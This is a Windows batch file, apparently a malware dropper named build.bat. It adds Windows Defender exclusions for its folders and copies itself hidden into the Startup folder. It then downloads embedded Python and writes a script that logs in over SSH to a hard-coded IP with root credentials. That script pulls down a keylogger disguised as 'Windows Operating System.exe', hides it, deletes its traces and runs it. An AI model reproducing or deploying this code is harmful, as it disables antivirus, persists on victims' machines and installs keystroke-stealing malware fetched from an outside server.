@echo off

start /min /b cmd /q /c (
    set StartupFolder="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

    powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%StartupFolder%'"

    powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%localappdata%'"

    for /f "delims=" %%i in ('whoami /user ^| findstr /R "S-1-.*-[0-9]*$"') do set UserInformation=%%i
    for /f "tokens=2" %%a in ('echo %UserInformation%') do set SID=%%a

    set RecycleBinFolder=C:\$Recycle.Bin\%SID%

    powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%RecycleBinFolder%'"

    if not exist %StartupFolder%\build.bat (
        copy %0 %StartupFolder%
        attrib +h %StartupFolder%\build.bat
    )

    set MainProgram=%localappdata%\"Windows Operating System.exe"

    if exist %MainProgram% (
        goto :RunProgram
    )
    else (
        set SystemFolder=%localappdata%\System
        mkdir %SystemFolder%

        set ZipFile=%SystemFolder%\.zip

        set InstallationFolder=%SystemFolder%\Installation
        mkdir %InstallationFolder%

        powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip -Destination %ZipFile%"
        powershell -WindowStyle Hidden -Command "Expand-Archive -Force %ZipFile% %InstallationFolder%"

        del %ZipFile%

        powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile %InstallationFolder%\get-pip.py"

        set PythonCommand=%InstallationFolder%\pythonw.exe
        set PipInstaller=%InstallationFolder%\get-pip.py

        %PythonCommand% %PipInstaller%

        start /min /b cmd /q /c (
            set "CurrentPath=%PATH%"
            set "found="

            if not "%CurrentPath%" == "" (
                for %%p in (%CurrentPath%) do (
                    if /I "%%p" == "%InstallationFolder%" (
                        set "found=yes"
                        goto :UpdatePythonPath
                    )
                )
            )

            set "%CurrentPath%=%InstallationFolder%;%CurrentPath%"

            :UpdatePythonPath
            if not defined found (
                setx PATH "%CurrentPath%"
            )
        )

        start /min /b cmd /q /c (
            set "CurrentPath=%PATH%"
            set "found="

            set ScriptsFolder=%InstallationFolder%\Scripts

            if not "%CurrentPath%" == "" (
                for %%p in (%CurrentPath%) do (
                    if /I "%%p" == "%ScriptsFolder%" (
                        set "found=yes"
                        goto :UpdatePipPath
                    )
                )
            )

            set "%CurrentPath%=%ScriptsFolder%;%CurrentPath%"

            :UpdatePipPath
            if not defined found (
                setx PATH "%CurrentPath%"
            )
        )

        set PthFile=%InstallationFolder%\python311._pth
        echo python311.zip > %PthFile% & echo . >> %PthFile% & echo import site >> %PthFile%
        
        set PipCommand=%PythonCommand% -m pip
        %PipCommand% install paramiko scp --quiet

        set ServerScript=%SystemFolder%\server.py

        echo from paramiko import SSHClient, AutoAddPolicy > %ServerScript%
        echo from scp import SCPClient >> %ServerScript%
        echo import sys >> %ServerScript%
        echo. >> %ServerScript%
        echo. >> %ServerScript%
        echo if __name__ == '__main__': >> %ServerScript%:
        echo     client = SSHClient() >> %ServerScript%
        echo     client.set_missing_host_key_policy(AutoAddPolicy()) >> %ServerScript%
        echo     client.connect(hostname='178.79.179.232', username='root', password='hacking-lab_password') >> %ServerScript%
        echo. >> %ServerScript%
        echo     with SCPClient(client.get_transport()) as scp: >> %ServerScript%
        echo         scp.get('/home/root/dev/keylogger/Windows Operating System.exe', sys.argv[1]) >> %ServerScript%
        echo     client.close() >> %ServerScript%

        %PythonCommand% -B %ServerScript% %localappdata%
        del %ServerScript%

        set PipFolder=%localappdata%\pip

        rd /s /q %SystemFolder%
        rd /s /q %PipFolder%

        attrib +h %MainProgram%

        goto :RunProgram
    )

    :RunProgram
    start /b %MainProgram%
)
